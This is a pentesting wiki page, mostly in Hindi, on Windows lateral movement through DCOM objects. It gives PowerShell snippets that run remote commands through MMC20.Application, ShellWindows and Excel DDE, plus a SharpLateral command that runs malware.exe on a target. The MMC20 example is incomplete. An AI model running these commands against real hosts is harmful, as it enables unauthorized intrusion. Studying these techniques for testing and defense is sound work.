# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**इस तकनीक के बारे में अधिक जानकारी के लिए [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) से मूल पोस्ट देखें।**

Distributed Component Object Model (DCOM) ऑब्जेक्ट्स नेटवर्क-आधारित इंटरैक्शन के लिए एक दिलचस्प क्षमता प्रस्तुत करते हैं। Microsoft DCOM और Component Object Model (COM) के लिए व्यापक दस्तावेज़ीकरण प्रदान करता है, जो [DCOM के लिए यहाँ](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [COM के लिए यहाँ](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) उपलब्ध है। DCOM अनुप्रयोगों की एक सूची PowerShell कमांड का उपयोग करके प्राप्त की जा सकती है:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM ऑब्जेक्ट, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC स्नैप-इन ऑपरेशनों के स्क्रिप्टिंग की अनुमति देता है। विशेष रूप से, इस ऑब्जेक्ट में `Document.ActiveView` के तहत `ExecuteShellCommand` विधि शामिल है। इस विधि के बारे में अधिक जानकारी [यहां](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाते हुए देखें:

यह सुविधा एक नेटवर्क पर DCOM एप्लिकेशन के माध्यम से कमांड निष्पादित करने की सुविधा प्रदान करती है। DCOM के साथ दूरस्थ रूप से एक व्यवस्थापक के रूप में बातचीत करने के लिए, PowerShell का उपयोग निम्नलिखित तरीके से किया जा सकता है:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
यह कमांड DCOM एप्लिकेशन से कनेक्ट करता है और COM ऑब्जेक्ट का एक उदाहरण लौटाता है। ExecuteShellCommand विधि को फिर दूरस्थ होस्ट पर एक प्रक्रिया निष्पादित करने के लिए बुलाया जा सकता है। प्रक्रिया में निम्नलिखित चरण शामिल हैं:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE प्राप्त करें:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**इस तकनीक के बारे में अधिक जानकारी के लिए मूल पोस्ट देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** ऑब्जेक्ट को स्पष्ट "LaunchPermissions" की कमी के लिए पहचाना गया, जो व्यवस्थापकों को पहुंच की अनुमति देने वाले अनुमतियों पर डिफ़ॉल्ट होता है। अधिक विवरण के लिए, एक थ्रेड [यहां](https://twitter.com/tiraniddo/status/817532039771525120) खोजा जा सकता है, और बिना स्पष्ट Launch Permission के ऑब्जेक्ट को फ़िल्टर करने के लिए [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET के उपयोग की सिफारिश की जाती है।

दो विशेष ऑब्जेक्ट, `ShellBrowserWindow` और `ShellWindows`, को स्पष्ट Launch Permissions की कमी के कारण उजागर किया गया। `HKCR:\AppID\{guid}` के तहत `LaunchPermission` रजिस्ट्री प्रविष्टि की अनुपस्थिति स्पष्ट अनुमतियों की कमी को दर्शाती है।

### ShellWindows

`ShellWindows` के लिए, जो एक ProgID की कमी है, .NET विधियाँ `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके ऑब्जेक्ट इंस्टेंटिएशन को सुविधाजनक बनाती हैं। यह प्रक्रिया `ShellWindows` के लिए CLSID प्राप्त करने के लिए OleView .NET का उपयोग करती है। एक बार इंस्टेंटिएट होने के बाद, `WindowsShell.Item` विधि के माध्यम से इंटरैक्शन संभव है, जिससे `Document.Application.ShellExecute` जैसी विधियों का आह्वान होता है।

ऑब्जेक्ट को इंस्टेंटिएट करने और दूरस्थ रूप से कमांड निष्पादित करने के लिए उदाहरण PowerShell कमांड प्रदान किए गए थे:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement को DCOM Excel objects का उपयोग करके प्राप्त किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के माध्यम से lateral movement के लिए Excel DDE का उपयोग करने पर चर्चा पढ़ना उचित है [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)।

Empire प्रोजेक्ट एक PowerShell स्क्रिप्ट प्रदान करता है, जो DCOM objects को हेरफेर करके Excel के लिए remote code execution (RCE) के उपयोग को प्रदर्शित करता है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) पर उपलब्ध स्क्रिप्ट से स्निप्पेट्स हैं, जो RCE के लिए Excel का दुरुपयोग करने के विभिन्न तरीकों को दर्शाते हैं:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automation Tools for Lateral Movement

इन तकनीकों को स्वचालित करने के लिए दो उपकरणों को उजागर किया गया है:

- **Invoke-DCOM.ps1**: एक PowerShell स्क्रिप्ट जो Empire प्रोजेक्ट द्वारा प्रदान की गई है, जो दूरस्थ मशीनों पर कोड निष्पादित करने के विभिन्न तरीकों को सरल बनाती है। यह स्क्रिप्ट Empire GitHub रिपॉजिटरी पर उपलब्ध है।

- **SharpLateral**: एक उपकरण जो दूरस्थ रूप से कोड निष्पादित करने के लिए डिज़ाइन किया गया है, जिसे इस कमांड के साथ उपयोग किया जा सकता है:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatic Tools

- Powershell स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य मशीनों में कोड निष्पादित करने के लिए सभी टिप्पणी किए गए तरीकों को आसानी से लागू करने की अनुमति देती है।
- आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## संदर्भ

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
